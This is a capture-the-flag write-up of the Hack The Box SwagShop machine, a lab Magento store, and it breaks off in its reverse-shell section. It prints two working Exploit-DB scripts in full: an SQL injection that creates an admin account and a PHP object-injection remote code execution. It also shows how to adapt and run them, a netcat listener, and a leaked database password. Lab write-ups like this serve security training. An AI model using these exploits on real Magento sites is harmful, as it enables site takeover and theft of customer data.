I"aœ<h1 id="htb-swagshop-101010140-machine-write-up"><span style="color:red">HTB SWAGSHOP (10.10.10.140) MACHINE WRITE-UP</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>
<ul>
  <li><a href="#part-1--initital-recon">PART 1 : INITITAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#port-80-magento">PORT 80 (Magento)</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-a-shell">PART 4 : GENERATE A SHELL</a></li>
  <li><a href="#part-5--privilege-escalation-www-data---root">PART 5 : PRIVILEGE ESCALATION (www-data -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initital-recon">PART 1 : INITITAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 700 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.140
<span class="go">  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.140
<span class="go">  PORT   STATE SERVICE VERSION
</span><span class="gp">  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">  | ssh-hostkey: 
  |   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
  |   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
  |_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Home page
</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="port-80-magento">PORT 80 (Magento)</h3>

<ul>
  <li>
    <p><strong><code class="highlighter-rouge">http://10.10.10.140/</code></strong>:</p>

    <p><img src="./screenshots/30_swagshop/80_landing_page.png" alt="80 Landing Page" /></p>

    <blockquote>
      <p>There is a <a href=""><code class="highlighter-rouge">Magento</code></a> service running on <strong><em>port 80</em></strong>.</p>
    </blockquote>

    <blockquote>
      <p>Trying to register an account in <code class="highlighter-rouge">http://10.10.10.140/</code> brings you to <strong><code class="highlighter-rouge">http://10.10.10.140/index.php/customer/account/create/</code></strong> and if youâ€™ll notice, <strong><code class="highlighter-rouge">/index.php</code></strong> is not only an endpoint but also serves as a directory.</p>
    </blockquote>
  </li>
  <li>
    <p><strong><em>Wappalyzer</em></strong> (Firefox plugin):</p>

    <table>
      <thead>
        <tr>
          <th>eCommerce</th>
          <th>Programming Language</th>
          <th>Database</th>
          <th>Web Server</th>
          <th>Operating System</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>Magento</td>
          <td>PHP</td>
          <td>MySQL</td>
          <td>Apache 2.14.18</td>
          <td>Ubuntu</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <p><strong><code class="highlighter-rouge">gobuster</code></strong> on <strong><code class="highlighter-rouge">/</code></strong>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.140 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
<span class="go">  /media (Status: 301)
  /includes (Status: 301)
  /lib (Status: 301)
  /app (Status: 301)
  /js (Status: 301)
  /shell (Status: 301)
  /skin (Status: 301)
  /var (Status: 301)
  /errors (Status: 301)
</span></code></pre></div>    </div>
  </li>
  <li>
    <p><strong><code class="highlighter-rouge">http://10.10.10.140/app/etc/local.xml</code></strong>:</p>

    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;install&gt;</span>
  <span class="nt">&lt;date&gt;</span>Wed, 08 May 2019 07:23:09 +0000<span class="nt">&lt;/date&gt;</span>
<span class="nt">&lt;/install&gt;</span>
<span class="nt">&lt;crypt&gt;</span>
  <span class="nt">&lt;key&gt;</span>b355a9e0cd018d3f7f03607141518419<span class="nt">&lt;/key&gt;</span>
<span class="nt">&lt;/crypt&gt;</span>
<span class="nt">&lt;disable_local_modules&gt;</span>false<span class="nt">&lt;/disable_local_modules&gt;</span>
<span class="nt">&lt;resources&gt;</span>
  <span class="nt">&lt;db&gt;&lt;table_prefix&gt;&lt;/table_prefix&gt;&lt;/db&gt;</span>
  <span class="nt">&lt;default_setup&gt;</span>
    <span class="nt">&lt;connection&gt;</span>
      <span class="nt">&lt;host&gt;</span>localhost<span class="nt">&lt;/host&gt;</span>
      <span class="nt">&lt;username&gt;</span>root<span class="nt">&lt;/username&gt;</span>
      <span class="nt">&lt;password&gt;</span>fMVWh7bDHpgZkyfqQXreTjU9<span class="nt">&lt;/password&gt;</span>
      <span class="nt">&lt;dbname&gt;</span>swagshop<span class="nt">&lt;/dbname&gt;</span>
      <span class="nt">&lt;initStatements&gt;</span>SET NAMES utf8<span class="nt">&lt;/initStatements&gt;</span>
      <span class="nt">&lt;model&gt;</span>mysql4<span class="nt">&lt;/model&gt;</span>
      <span class="nt">&lt;type&gt;</span>pdo_mysql<span class="nt">&lt;/type&gt;</span>
      <span class="nt">&lt;pdoType&gt;&lt;/pdoType&gt;</span>
      <span class="nt">&lt;active&gt;</span>1<span class="nt">&lt;/active&gt;</span>
    <span class="nt">&lt;/connection&gt;</span>
  <span class="nt">&lt;/default_setup&gt;</span>
<span class="nt">&lt;/resources&gt;</span>
</code></pre></div>    </div>
    <blockquote>
      <p>There is a Magento config file on <strong><code class="highlighter-rouge">http://10.10.10.140/app/etc/local.xml</code></strong>.</p>
    </blockquote>
  </li>
  <li><strong><code class="highlighter-rouge">gobuster</code></strong> on <strong><code class="highlighter-rouge">/index.php</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.140/index.php <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
<span class="go">  /home (Status: 200)
  /0 (Status: 200)
  /contacts (Status: 200)
  /catalog (Status: 302)
  /admin (Status: 200)
  /Home (Status: 200)
  /core (Status: 200)
  /install (Status: 302)
  /cms (Status: 200)
  /api (Status: 200)
  /checkout (Status: 302)
  /wishlist (Status: 302)
</span></code></pre></div>    </div>
  </li>
  <li>
    <p><strong><code class="highlighter-rouge">http://10.10.10.140/index.php/admin</code></strong>:</p>

    <p><img src="./screenshots/30_swagshop/80_admin_login.png" alt="80 Admin Login" /></p>

    <blockquote>
      <p>There is a login page to access the <strong><em>Admin Panel</em></strong></p>
    </blockquote>
  </li>
</ul>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<ol>
  <li>
    <p><strong><code class="highlighter-rouge">searchsploit</code></strong>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit magento
<span class="go">  --------------------------------------------------------------------------------------------------------- ----------------------------------------
   Exploit Title                                                                                           |  Path
                                                                                                           | (/usr/share/exploitdb/)
  -------------------------------------------------------------------------------------------------------------------------------------------------
  Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting       | exploits/php/webapps/32808.txt
  Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting | exploits/php/webapps/32809.txt
  Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                | exploits/php/webapps/32810.txt
  Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                           | exploits/php/webapps/39838.php
  Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                             | exploits/php/webapps/37811.py
  Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                   | exploits/php/webapps/35996.txt
  Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                              | exploits/php/webapps/35052.txt
  Magento eCommerce - Local File Disclosure                                                                | exploits/php/webapps/19793.txt
  Magento eCommerce - Remote Code Execution                                                                | exploits/xml/webapps/37977.py
  eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                             | exploits/php/webapps/38573.txt
  eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                  | exploits/php/webapps/38651.txt
  --------------------------------------------------------------------------------------------------------- ----------------------------------------
</span></code></pre></div>    </div>
    <blockquote>
      <p>Since this box is rated with a <strong><code class="highlighter-rouge">9/10</code></strong> for CVE by the box creator, this should be a step in the right direction</p>
    </blockquote>

    <blockquote>
      <p><strong><code class="highlighter-rouge">exploits/php/webapps/37811.py</code></strong> and <strong><code class="highlighter-rouge">exploits/xml/webapps/37977.py</code></strong> might be of interest due to their high severity.</p>
    </blockquote>

    <blockquote>
      <blockquote>
        <p><strong><code class="highlighter-rouge">exploits/xml/webapps/37977.py</code></strong> creates an admin account with credentials, <strong><code class="highlighter-rouge">forme : forme</code></strong>, if the Magento service running is vulnerable.</p>
      </blockquote>
    </blockquote>

    <blockquote>
      <blockquote>
        <p><strong><code class="highlighter-rouge">exploits/php/webapps/37811.py</code></strong> is an authenticated remote code execution exploit.</p>
      </blockquote>
    </blockquote>

    <blockquote>
      <p>The two exploits mentioned above seem to go hand in hand with each other.</p>
    </blockquote>
  </li>
  <li>Create an admin account using <strong><code class="highlighter-rouge">37977.py</code></strong>:
    <ol>
      <li>Download the exploit:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> exploits/xml/webapps/37977.py
<span class="go">    Exploit: Magento eCommerce - Remote Code Execution
        URL: https://www.exploit-db.com/exploits/37977
       Path: /usr/share/exploitdb/exploits/xml/webapps/37977.py
  File Type: ASCII text, with CRLF line terminators
        
  Copied to: /root/Desktop/htb_boxes/SwagShop/exploits/37977.py
</span></code></pre></div>        </div>
      </li>
      <li>Inspect the exploit:
        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...omitted...
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>
      
<span class="n">target</span> <span class="o">=</span> <span class="s">"http://target.com/"</span>
      
<span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"http"</span><span class="p">):</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
      
<span class="k">if</span> <span class="n">target</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
      
<span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s">"/admin/Cms_Wysiwyg/directive/index/"</span>
      
<span class="n">q</span><span class="o">=</span><span class="s">"""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""</span>
      
      
<span class="n">query</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">"forme"</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">"forme"</span><span class="p">)</span>
<span class="n">pfilter</span> <span class="o">=</span> <span class="s">"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
      
<span class="c1"># e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is
</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> 
                  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"___directive"</span><span class="p">:</span> <span class="s">"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"</span><span class="p">,</span>
                        <span class="s">"filter"</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pfilter</span><span class="p">),</span>
                        <span class="s">"forwarded"</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"WORKED"</span>
    <span class="k">print</span> <span class="s">"Check {0}/admin with creds forme:forme"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"DID NOT WORK"</span>
<span class="c1"># ...omitted...
</span></code></pre></div>        </div>
      </li>
      <li>Tweak the exploit:
        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># [CHANGE]
</span><span class="n">target</span> <span class="o">=</span> <span class="s">"http://target.com/"</span>

<span class="c1"># [TO]
</span><span class="n">target</span> <span class="o">=</span> <span class="s">"http://10.10.10.140/index.php/"</span>
</code></pre></div>        </div>
      </li>
      <li>Run the exploit:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python 37977.py
<span class="go">  WORKED
  Check http://10.10.10.140/index.php/admin with creds forme:forme
</span></code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>
    <p>Login using the created credentials on <strong><code class="highlighter-rouge">http://10.10.10.140/index.php/admin</code></strong>:</p>

    <p><img src="./screenshots/30_swagshop/80_admin_panel.png" alt="80 Admin Panel" /></p>
  </li>
  <li>Attempt Remote Code Execution using <strong><code class="highlighter-rouge">37811.py</code></strong>:
    <ol>
      <li>Download the exploit:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/37811.py
<span class="go">    Exploit: Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution
        URL: https://www.exploit-db.com/exploits/37811
       Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
  File Type: Python script, ASCII text executable, with CRLF line terminators
        
  Copied to: /root/Desktop/htb_boxes/SwagShop/exploits/37811.py
</span></code></pre></div>        </div>
      </li>
      <li>Inspect the exploit:
        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...omitted...
</span><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">mechanize</span>
      
      
<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="k">print</span> <span class="s">"Usage: python </span><span class="si">%</span><span class="s">s &lt;target&gt; &lt;argument&gt;</span><span class="se">\n</span><span class="s">Example: python </span><span class="si">%</span><span class="s">s http://localhost </span><span class="se">\"</span><span class="s">uname -a</span><span class="se">\"</span><span class="s">"</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
      
      
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
    <span class="n">usage</span><span class="p">()</span>
      
<span class="c1"># Command-line args
</span><span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">arg</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
      
<span class="c1"># Config.
</span><span class="n">username</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">php_function</span> <span class="o">=</span> <span class="s">'system'</span>  <span class="c1"># Note: we can only pass 1 argument to the function
</span><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Sat, 15 Nov 2014 20:27:57 +0000'</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml
</span>      
<span class="c1"># POP chain to pivot into call_user_exec
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'O:8:</span><span class="se">\"</span><span class="s">Zend_Log</span><span class="se">\"</span><span class="s">:1:{s:11:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_writers</span><span class="se">\"</span><span class="s">;a:2:{i:0;O:20:</span><span class="se">\"</span><span class="s">Zend_Log_Writer_Mail</span><span class="se">\"</span><span class="s">:4:{s:16:'</span> \
          <span class="s">'</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_eventsToMail</span><span class="se">\"</span><span class="s">;a:3:{i:0;s:11:</span><span class="se">\"</span><span class="s">EXTERMINATE</span><span class="se">\"</span><span class="s">;i:1;s:12:</span><span class="se">\"</span><span class="s">EXTERMINATE!</span><span class="se">\"</span><span class="s">;i:2;s:15:</span><span class="se">\"</span><span class="s">'</span> \
          <span class="s">'EXTERMINATE!!!!</span><span class="se">\"</span><span class="s">;}s:22:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_subjectPrependText</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_layout</span><span class="se">\"</span><span class="s">;O:23:</span><span class="se">\"</span><span class="s">'</span>     \
          <span class="s">'Zend_Config_Writer_Yaml</span><span class="se">\"</span><span class="s">:3:{s:15:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_yamlEncoder</span><span class="se">\"</span><span class="s">;s:</span><span class="si">%</span><span class="s">d:</span><span class="se">\"</span><span class="si">%</span><span class="s">s</span><span class="se">\"</span><span class="s">;s:17:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">'</span>     \
          <span class="s">'_loadedSection</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_config</span><span class="se">\"</span><span class="s">;O:13:</span><span class="se">\"</span><span class="s">Varien_Object</span><span class="se">\"</span><span class="s">:1:{s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_data</span><span class="se">\"</span><span class="s">'</span> \
          <span class="s">';s:</span><span class="si">%</span><span class="s">d:</span><span class="se">\"</span><span class="si">%</span><span class="s">s</span><span class="se">\"</span><span class="s">;}}s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_mail</span><span class="se">\"</span><span class="s">;O:9:</span><span class="se">\"</span><span class="s">Zend_Mail</span><span class="se">\"</span><span class="s">:0:{}}i:1;i:2;}}'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">php_function</span><span class="p">),</span> <span class="n">php_function</span><span class="p">,</span>
                                                                                     <span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">),</span> <span class="n">arg</span><span class="p">)</span>
<span class="c1"># Setup the mechanize browser and options
</span><span class="n">br</span> <span class="o">=</span> <span class="n">mechanize</span><span class="o">.</span><span class="n">Browser</span><span class="p">()</span>
<span class="c1">#br.set_proxies({"http": "localhost:8080"})
</span><span class="n">br</span><span class="o">.</span><span class="n">set_handle_robots</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
      
<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
      
<span class="n">br</span><span class="o">.</span><span class="n">select_form</span><span class="p">(</span><span class="n">nr</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="n">br</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">new_control</span><span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">'login[username]'</span><span class="p">,</span> <span class="p">{</span><span class="s">'value'</span><span class="p">:</span> <span class="n">username</span><span class="p">})</span>  <span class="c1"># Had to manually add username control.
</span><span class="n">br</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">fixup</span><span class="p">()</span>
<span class="n">br</span><span class="p">[</span><span class="s">'login[username]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
<span class="n">br</span><span class="p">[</span><span class="s">'login[password]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
      
<span class="n">br</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="s">"POST"</span>
<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
      
<span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"ajaxBlockUrl = </span><span class="se">\'</span><span class="s">(.*)</span><span class="se">\'</span><span class="s">"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"var FORM_KEY = '(.*)'"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
      
<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/7d/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"src=</span><span class="se">\"</span><span class="s">(.*)</span><span class="err">\</span><span class="s">?ga="</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">tunnel</span> <span class="o">=</span> <span class="n">tunnel</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
      
<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">gh</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">install_date</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
      
<span class="n">exploit</span> <span class="o">=</span> <span class="n">tunnel</span> <span class="o">+</span> <span class="s">'?ga='</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'&amp;h='</span> <span class="o">+</span> <span class="n">gh</span>
      
<span class="k">try</span><span class="p">:</span>
    <span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
<span class="k">except</span> <span class="p">(</span><span class="n">mechanize</span><span class="o">.</span><span class="n">HTTPError</span><span class="p">,</span> <span class="n">mechanize</span><span class="o">.</span><span class="n">URLError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span> <span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre></div>        </div>
      </li>
      <li>Tweak the exploit:
        <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># [CHANGE]
</span><span class="n">username</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">''</span>
<span class="c1"># ...
</span><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Sat, 15 Nov 2014 20:27:57 +0000'</span>
<span class="c1"># ...
</span><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/7d/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>

<span class="p">[</span><span class="n">TO</span><span class="p">]</span>
<span class="n">username</span> <span class="o">=</span> <span class="s">'forme'</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">'forme'</span>
<span class="c1"># ...
</span><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Wed, 08 May 2019 07:23:09 +0000'</span>
<span class="c1"># ...
</span><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/1y/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
</code></pre></div>        </div>

        <blockquote>
          <p>The <strong><code class="highlighter-rouge">install_date</code></strong> could be found on the Magento config (<strong><code class="highlighter-rouge">/app/etc/local.xml</code></strong>) found earlier.</p>
        </blockquote>

        <blockquote>
          <p>It was reuired to change <strong><code class="highlighter-rouge">.../7d/...</code></strong> to <strong><code class="highlighter-rouge">.../1y/...</code></strong> since the exploitâ€™s query should return a value in order to work and there were no recorded transactions in the Magento service in the past 7 days; however, there were transactions within the year since the box was released and this write-up was posted.</p>
        </blockquote>

        <blockquote>
          <blockquote>
            <p>Valid options are <strong><code class="highlighter-rouge">24h</code></strong>, <strong><code class="highlighter-rouge">7d</code></strong>, <strong><code class="highlighter-rouge">1m</code></strong>, <strong><code class="highlighter-rouge">1y</code></strong>, and <strong><code class="highlighter-rouge">2y</code></strong>.</p>
          </blockquote>
        </blockquote>
      </li>
      <li>Run the exploit:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python 37811.py http://10.10.10.140/index.php/admin <span class="s2">"id"</span>
<span class="go">  uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></code></pre></div>        </div>
      </li>
    </ol>
  </li>
</ol>

<hr />

<h2 id="part-4--generate-a-shell">PART 4 : GENERATE A SHELL</h2>

<ol>
  <li>Set-up a listener:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
<span class="go">  listening on [any] 4444 ...
</span></code></pre></div>    </div>
  </li>
  <li>Run a <strong>python</strong> reverse shell using <strong><code class="highlighter-rouge">37811.py</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ifconfig
<span class="gp">  tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;</span><span class="w">  </span>mtu 1500
<span class="go">          inet 10.10.14.16  netmask 255.255.254.0  destination 10.10.14.16
          ...omitted...                
